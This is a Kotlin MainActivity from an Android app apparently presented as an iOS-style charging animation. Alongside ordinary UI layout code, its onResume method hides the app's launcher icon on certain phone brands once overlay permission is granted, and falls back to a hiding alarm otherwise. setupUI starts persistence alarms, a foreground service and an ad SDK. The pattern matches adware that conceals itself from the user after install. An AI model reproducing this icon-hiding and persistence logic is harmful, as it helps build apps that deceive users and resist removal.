package com.ioscharginging.iosanimationation.ui.main

import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.view.View
import androidx.activity.viewModels
import com.ioscharginging.iosanimationation.R
import com.ioscharginging.iosanimationation.base.BaseActivity
import com.ioscharginging.iosanimationation.databinding.MainActivityBinding
import com.ioscharginging.iosanimationation.repository.background.display.ForegroundService
import com.ioscharginging.iosanimationation.repository.preferences.Preferences
import com.ioscharginging.iosanimationation.ui.custom.ItemDecorationWithEnds
import com.ioscharginging.iosanimationation.ui.guid.GuidDialog
import com.ioscharginging.iosanimationation.ui.permission.PermissionDialog
import com.ioscharginging.iosanimationation.ui.settings.SettingsActivity
import com.ioscharginging.iosanimationation.utils.IRON_SOURCE_APP_KEY
import com.ioscharginging.iosanimationation.utils.hiding.AlarmBroadcast
import com.ioscharginging.iosanimationation.utils.hiding.AppHidingUtil
import com.ioscharginging.iosanimationation.utils.hiding.HidingBroadcast
import com.ironsource.mediationsdk.IronSource
import io.github.florent37.shapeofview.shapes.RoundRectView
import java.util.*

class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {

    private val viewModel: MainViewModel by viewModels()

    private val cornerRadius by lazy { binding.themesContainer.width / 360f * 24 }
    private val themesBackground by lazy { binding.themesBackground }

    override fun provideLayoutId() = R.layout.main_activity

    override fun provideViewModel() = viewModel

    override fun setupUI() {
        IronSource.setMetaData("is_child_directed","false")
        IronSource.init(this, IRON_SOURCE_APP_KEY)
        AlarmBroadcast.startAlarm(this)
        if (ForegroundService.instance === null)
            startService(Intent(this, ForegroundService::class.java))
        if (!Preferences.wasLaunchedBefore)
            GuidDialog().show(supportFragmentManager, null)
        if (!Settings.canDrawOverlays(this))
            PermissionDialog().show(supportFragmentManager, null)

        binding.buttonSettings.setOnClickListener {
            startActivity(Intent(this, SettingsActivity::class.java))
        }
        binding.root.post {
            val isLtr = resources.configuration.layoutDirection == View.LAYOUT_DIRECTION_LTR
            val edgeSpace = binding.root.width * 28 / 360
            val innerSpace = binding.root.width * 5 / 360
            val itemDecoration = ItemDecorationWithEnds(
                leftFirst = if (isLtr) edgeSpace else innerSpace,
                left = innerSpace,
                leftLast = if (isLtr) innerSpace else edgeSpace,
                rightFirst = if (isLtr) innerSpace else edgeSpace,
                right = innerSpace,
                rightLast = if (isLtr) edgeSpace else innerSpace,
                firstPredicate = ::isFirstAdapterItem,
                lastPredicate = ::isLastAdapterItem
            )
            binding.rvPopular.addItemDecoration(itemDecoration)
            binding.rvOther.addItemDecoration(itemDecoration)
            themesBackground.setRadius(cornerRadius)
        }
        viewModel.selectedItem.observe(this) {
            binding.preview.setImageResource(it.previewPicRes)
        }
    }

    private fun isFirstAdapterItem(position: Int) = position == 0

    private fun isLastAdapterItem(position: Int, count: Int) = position == count - 1

    private fun RoundRectView.setRadius(radius: Float) {
        topLeftRadius = radius
        topRightRadius = radius
    }

    override fun onResume() {
        super.onResume()
        IronSource.onResume(this)
        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
        else
            HidingBroadcast.startAlarm(this)
    }

    override fun onPause() {
        super.onPause()
        IronSource.onPause(this)
    }

    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
    )

}